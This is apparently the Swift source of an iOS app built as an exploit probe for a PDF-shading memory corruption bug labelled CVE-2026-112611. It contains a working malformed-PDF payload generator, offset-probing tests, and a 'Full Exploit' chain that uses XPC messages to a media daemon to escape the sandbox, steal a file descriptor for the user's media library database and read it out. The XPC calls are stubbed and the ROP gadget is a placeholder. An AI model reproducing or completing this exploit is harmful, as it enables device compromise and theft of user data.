import SwiftUI
import CoreGraphics
import Foundation

// MARK: - XPC Stubs (renamed to avoid conflicts)

typealias ExploitXPCConnection = UnsafeMutableRawPointer
typealias ExploitXPCObject = UnsafeMutableRawPointer

func exploit_xpc_connect(_ service: String) -> ExploitXPCConnection? { nil }
func exploit_xpc_dict_create() -> ExploitXPCObject? { nil }
func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ value: String) {}
func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? { nil }
func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 { -1 }

// MARK: - Data-Only Attack Probe (Single Test)

/// Run a specific test by number
func runTest(_ testNumber: Int) {
    print("[*] Running Test \(testNumber)...")
    
    switch testNumber {
    case 1:
        print("[*] Test 1: Null pointer (0x0)")
        testValueAtOffset(value: 0x0000000000000000)
    case 2:
        print("[*] Test 2: Small integer (0x1000)")
        testValueAtOffset(value: 0x0000000000001000)
    case 3:
        print("[*] Test 3: Stack address (0x160000000)")
        testValueAtOffset(value: 0x0000000160000000)
    case 4:
        print("[*] Test 4: Heap address (0x100000000)")
        testValueAtOffset(value: 0x0000000100000000)
    case 5:
        print("[*] Test 5: Kernel address (0xfffffe0000000000)")
        testValueAtOffset(value: 0xfffffe0000000000)
    default:
        print("[!] Invalid test number: \(testNumber)")
    }
}

/// Test specific value at buffer + 0x1c
func testValueAtOffset(value: UInt64) {
    var values = [Double](repeating: 0.0, count: 136)
    
    // Place value at index 3-4 (offset 0x1c = 28 bytes = index 3.5)
    let valueDouble = Double(bitPattern: value)
    values[3] = valueDouble
    values[4] = valueDouble
    
    let pdfData = PDFPayload.shadingWithValues(values)
    renderPDF(pdfData)
}

// MARK: - Full Exploit (after finding primitive)

func runFullExploit() {
    print("[*] Stage 1: Triggering WebContent RCE via CVE-2026-112611...")
    
    // Based on probe results, use the working primitive
    let gadgetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real ROP gadget
    testValueAtOffset(value: gadgetAddress)
    
    print("[*] Stage 2: Sandbox escape via CVE-2026-112706...")
    
    let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
    let stolenFD = stealFileDescriptor(path: targetPath)
    
    if stolenFD >= 0 {
        print("[+] Sandbox escape successful! FD: \(stolenFD)")
        
        if let data = readWithStolenFD(fd: stolenFD, length: 1024 * 1024) {
            print("[+] Exfiltrated \(data.count) bytes")
        }
        
        close(stolenFD)
    } else {
        print("[-] Sandbox escape failed (XPC stubs active)")
    }
    
    print("[*] Exploit chain complete")
}

// MARK: - CVE-2026-112706: Sandbox Escape

func stealFileDescriptor(path: String) -> Int32 {
    let connection = exploit_xpc_connect("com.apple.mediaplaybackd.bytestream")
    guard connection != nil else { return -1 }
    
    let handshake = exploit_xpc_dict_create()
    exploit_xpc_dict_set_string(handshake!, "msg", "origin")
    exploit_xpc_dict_set_string(handshake!, "id", "com.apple.WebKit.WebContent")
    
    _ = exploit_xpc_send_sync(connection!, handshake!)
    
    let createMsg = exploit_xpc_dict_create()
    exploit_xpc_dict_set_string(createMsg!, "msg", "Curl")
    exploit_xpc_dict_set_string(createMsg!, "path", path)
    
    let reply = exploit_xpc_send_sync(connection!, createMsg!)
    guard reply != nil else { return -1 }
    
    return exploit_xpc_dict_dup_fd(reply!, "fd")
}

func readWithStolenFD(fd: Int32, length: Int) -> Data? {
    var buffer = [UInt8](repeating: 0, count: length)
    let bytesRead = read(fd, &buffer, length)
    guard bytesRead > 0 else { return nil }
    return Data(buffer[0..<bytesRead])
}

// MARK: - PDF Rendering

func renderPDF(_ data: Data) {
    let tempURL = FileManager.default.temporaryDirectory
        .appendingPathComponent("probe.pdf")
    
    try? data.write(to: tempURL)
    
    guard let provider = CGDataProvider(url: tempURL as CFURL),
          let doc = CGPDFDocument(provider),
          let page = doc.page(at: 1) else {
        return
    }
    
    let context = CGContext(data: nil, width: 256, height: 256,
                           bitsPerComponent: 8, bytesPerRow: 256 * 4,
                           space: CGColorSpaceCreateDeviceRGB(),
                           bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
    
    context.drawPDFPage(page)
}

// MARK: - App Entry Point

@main
struct SafeShadingDemoApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

struct ContentView: View {
    @State private var selectedTest = 1
    @State private var status = "Ready to probe"
    @State private var isRunning = false
    @State private var logOutput = ""
    
    var body: some View {
        VStack(spacing: 20) {
            Text("CVE-2026-112611 Probe")
                .font(.largeTitle)
                .bold()
            
            Text("Data-Only Attack: Control buffer+0x1c")
                .font(.headline)
            
            // Test selector
            Picker("Test", selection: $selectedTest) {
                Text("T1: Null").tag(1)
                Text("T2: 0x1000").tag(2)
                Text("T3: Stack").tag(3)
                Text("T4: Heap").tag(4)
                Text("T5: Kernel").tag(5)
            }
            .pickerStyle(SegmentedPickerStyle())
            .padding(.horizontal)
            
            ScrollView {
                Text(logOutput)
                    .font(.system(.body, design: .monospaced))
                    .foregroundColor(.green)
                    .padding()
            }
            .frame(height: 150)
            .background(Color.black.opacity(0.8))
            .cornerRadius(10)
            
            HStack(spacing: 20) {
                Button(action: runSelectedTest) {
                    Text(isRunning ? "Running..." : "Run Test \(selectedTest)")
                        .font(.title3)
                        .bold()
                        .foregroundColor(.white)
                        .padding()
                        .background(isRunning ? Color.gray : Color.orange)
                        .cornerRadius(10)
                }
                .disabled(isRunning)
                
                Button(action: runExploit) {
                    Text("Full Exploit")
                        .font(.title3)
                        .bold()
                        .foregroundColor(.white)
                        .padding()
                        .background(Color.red)
                        .cornerRadius(10)
                }
            }
        }
        .padding()
    }
    
    func runSelectedTest() {
        isRunning = true
        logOutput = "[*] Starting Test \(selectedTest)...\n"
        logOutput += "[*] Value will be placed at buffer+0x1c\n"
        logOutput += "[*] Check crash log for 'far' address\n"
        
        DispatchQueue.global(qos: .userInitiated).async {
            runTest(selectedTest)
            
            DispatchQueue.main.async {
                logOutput += "[*] Test complete (or crashed)\n"
                isRunning = false
            }
        }
    }
    
    func runExploit() {
        isRunning = true
        logOutput = "[*] Running full exploit...\n"
        
        DispatchQueue.global(qos: .userInitiated).async {
            runFullExploit()
            
            DispatchQueue.main.async {
                logOutput += "[*] Exploit complete\n"
                isRunning = false
            }
        }
    }
}

// MARK: - PDF Payload Builder

enum PDFPayload {
    static func shadingWithValues(_ values: [Double]) -> Data {
        let bpCoord = 32
        let bpComp = 8
        
        var bw = BitWriter()
        var verts: [(UInt32, UInt32)] = []
        
        for r in 0..<2 {
            for c in 0..<2 {
                verts.append((UInt32(0x1000_0000 + c * 0x0800_0000), UInt32(0x1000_0000 + r * 0x0800_0000)))
            }
        }
        
        for (x, y) in verts {
            bw.put(x, bpCoord)
            bw.put(y, bpCoord)
            bw.put(0, bpComp)
        }
        
        let stream = bw.flush()
        
        let list = values.map { String(format: "%.17g", $0) }.joined(separator: " ")
        let rangeList = Array(repeating: "0 1", count: values.count).joined(separator: " ")
        
        var pdf = PDFBuilder()
        pdf.add(1, "<< /Type /Catalog /Pages 2 0 R >>")
        pdf.add(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>")
        pdf.add(4, "<< /Length 8 >>", Array(" /Sh1 sh".utf8))
        pdf.add(5, "<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate \(bpCoord) /BitsPerComponent \(bpComp) /VerticesPerRow 2 /Decode [0 200 0 200 0 1] /Function 6 0 R /Length \(stream.count) >>", stream)
        pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
        
        return pdf.data()
    }
}

struct BitWriter {
    private(set) var out: [UInt8] = []
    private var acc: UInt8 = 0
    private var nbits = 0
    
    mutating func put(_ value: UInt32, _ width: Int) {
        guard width > 0 else { return }
        for i in stride(from: width - 1, through: 0, by: -1) {
            acc = (acc << 1) | UInt8((value >> UInt32(i)) & 1)
            nbits += 1
            if nbits == 8 { out.append(acc); acc = 0; nbits = 0 }
        }
    }
    
    mutating func flush() -> [UInt8] {
        if nbits > 0 { out.append(acc << (8 - nbits)); acc = 0; nbits = 0 }
        return out
    }
}

struct PDFBuilder {
    private var objects: [Int: (dict: String, stream: [UInt8]?)] = [:]
    
    mutating func add(_ n: Int, _ dict: String, _ stream: [UInt8]? = nil) {
        objects[n] = (dict, stream)
    }
    
    func data() -> Data {
        var out = Data([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x37, 0x0A])
        out.append(Data([0x25, 0xE2, 0xE3, 0xCF, 0xD3, 0x0A]))
        
        var offsets: [Int: Int] = [:]
        
        for n in objects.keys.sorted() {
            guard let obj = objects[n] else { continue }
            offsets[n] = out.count
            
            let header = "\(n) 0 obj\n"
            out.append(Data(header.utf8))
            
            out.append(Data(obj.dict.utf8))
            
            if let stream = obj.stream {
                out.append(Data("\nstream\n".utf8))
                out.append(Data(stream))
                out.append(Data("\nendstream".utf8))
            }
            
            out.append(Data("\nendobj\n".utf8))
        }
        
        let xrefPos = out.count
        let maxObj = objects.keys.max() ?? 0
        
        let xrefHeader = "xref\n0 \(maxObj + 1)\n0000000000 65535 f \n"
        out.append(Data(xrefHeader.utf8))
        
        for n in 1...max(maxObj, 1) {
            let off = offsets[n] ?? 0
            let line = String(format: "%010d 00000 n \n", off)
            out.append(Data(line.utf8))
        }
        
        let trailer = "trailer\n<< /Size \(maxObj + 1) /Root 1 0 R >>\nstartxref\n\(xrefPos)\n%%EOF\n"
        out.append(Data(trailer.utf8))
        
        return out
    }
}
